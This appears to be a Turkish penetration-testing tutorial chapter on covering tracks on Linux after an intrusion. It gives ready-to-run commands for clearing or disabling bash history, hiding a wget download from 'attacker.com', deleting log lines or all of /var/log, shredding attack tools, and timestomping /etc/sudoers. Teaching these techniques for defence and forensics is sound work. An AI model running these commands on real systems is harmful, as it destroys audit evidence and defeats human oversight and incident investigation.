# 6.4. İz Temizleme (Defense Evasion & Credential Access)

[↩️ Geri: İçindekiler](../README.md)

Bir saldırgan hedeflerine ulaştıktan sonra, operasyonun son aşaması genellikle **iz temizlemedir**. Amaç, adli bilişim (forensics) analistlerinin veya sistem yöneticilerinin ne olduğunu anlamasını zorlaştırmak, saldırının tespit edilmesini geciktirmek ve gelecekteki operasyonlar için kullanılan araç ve teknikleri gizli tutmaktır.

> **Not:** Modern EDR (Endpoint Detection and Response) çözümleri ve merkezi log toplama sistemleri (SIEM), aşağıda anlatılan birçok tekniği etkisiz hale getirebilir. Ancak, daha az olgun güvenlik altyapılarına sahip hedeflerde bu teknikler hala etkilidir.

## 1. Komut Geçmişini (Bash History) Temizleme

Bir saldırganın en belirgin izlerinden biri, terminalde çalıştırdığı komutların kaydedildiği `~/.bash_history` dosyasıdır.

-   **Geçmiş Dosyasını Tamamen Silme:**
    En basit ama aynı zamanda en gürültülü (şüphe çekici) yöntemdir.
    ```bash
    rm ~/.bash_history
    ```

-   **Geçmişin Kaydedilmesini Engelleme:**
    Daha gizli bir yöntem, mevcut oturum için geçmişin kaydedilmesini engellemektir.
    ```bash
    # Mevcut oturum için history'i kapat
    unset HISTFILE
    # veya
    set +o history
    ```

-   **Belirli Satırları Silme:**
    Saldırgan, tüm geçmişi silmek yerine, sadece kendi çalıştırdığı şüpheli komutları (örn: `wget`, `nc`, `linpeas.sh`) `sed` veya başka bir metin editörü ile `~/.bash_history` dosyasından çıkarabilir. Bu daha az şüphe çeker.

-   **Boşluk Karakteri ile Komut Gizleme:**
    Birçok shell yapılandırmasında, bir komutun başına boşluk karakteri koymak, o komutun geçmişe kaydedilmesini engeller.
    ```bash
    <boşluk>wget http://attacker.com/evil.sh
    ```

## 2. Log Dosyalarını Manipüle Etme

Yeterli yetkilere (genellikle root) sahip bir saldırgan, sistemdeki eylemlerini gizlemek için log dosyalarını silmeye veya değiştirmeye çalışabilir.

-   **/var/log/auth.log veya /var/log/secure:**
    Saldırgan, kendi IP adresinden yapılan başarılı veya başarısız oturum açma denemelerini bu dosyalardan `grep -v` veya `sed` ile silebilir.
    ```bash
    # Kendi IP adresini (1.2.3.4) içeren satırları logdan kaldıran bir komut (konsept)
    sed -i '/1.2.3.4/d' /var/log/auth.log
    ```

-   **Tüm Logları Silme (En Gürültülü Yöntem):**
    ```bash
    # Tüm logları silmek sistem yöneticileri için büyük bir kırmızı bayraktır.
    rm -rf /var/log/*
    ```
    Bu eylemin kendisi bile genellikle loglanır (`/var/log/messages` içinde "log rotated" gibi) ve bir SIEM tarafından anında tespit edilebilir.

## 3. İndirilen Araçları ve Çıktıları Silme

Saldırgan, keşif veya yetki yükseltme için kullandığı script'leri (`linpeas.sh` gibi) ve bu script'lerin ürettiği raporları (`scan_results.txt` gibi) işi bittikten sonra sistemden güvenli bir şekilde silmelidir.

-   **Basit Silme:**
    ```bash
    rm /tmp/linpeas.sh /tmp/scan_results.txt
    ```

-   **Güvenli Silme (Secure Deletion):**
    `shred` komutu, bir dosyanın üzerine defalarca anlamsız veri yazarak, dosyanın adli bilişim araçlarıyla bile kurtarılmasını neredeyse imkansız hale getirir.
    ```bash
    shred -uz /tmp/very_sensitive_file.txt
    ```
    -   **`-u`**: Üzerine yazma işlemi bittikten sonra dosyayı siler.
    -   **`-z`**: Son olarak üzerine sıfırlarla yazar, böylece dosyanın daha önce orada olduğu belli olmaz.

## 4. Dosya Zaman Damgalarını (Timestamps) Değiştirme

Bir dosyayı düzenlediğinizde, son erişim (`atime`), son değişiklik (`mtime`) ve son durum değişikliği (`ctime`) zaman damgaları güncellenir. Bu, bir analistin hangi dosyaların ne zaman değiştirildiğini anlamasını sağlar. `touch` komutu, bir dosyanın zaman damgalarını manipüle etmek için kullanılabilir.

```bash
# Bir konfigürasyon dosyasını (A) düzenledikten sonra,
# zaman damgalarını başka bir sistem dosyasınınkiyle (B) aynı yapmak.
# Böylece A dosyası, ls -lt çıktısında göze batmaz.

# 1. Referans dosyanın zaman damgalarını al
touch -r /bin/ls /tmp/timestamp_reference

# 2. Değiştirdiğimiz dosyanın zaman damgalarını referansla aynı yap
touch -r /tmp/timestamp_reference /etc/sudoers

# 3. Geçici referans dosyasını sil
rm /tmp/timestamp_reference
```
Bu teknik, "timestomping" olarak bilinir ve saldırganın eylemlerinin zaman çizelgesini bozmayı amaçlar.

---
[↩️ Geri: İçindekiler](../README.md)
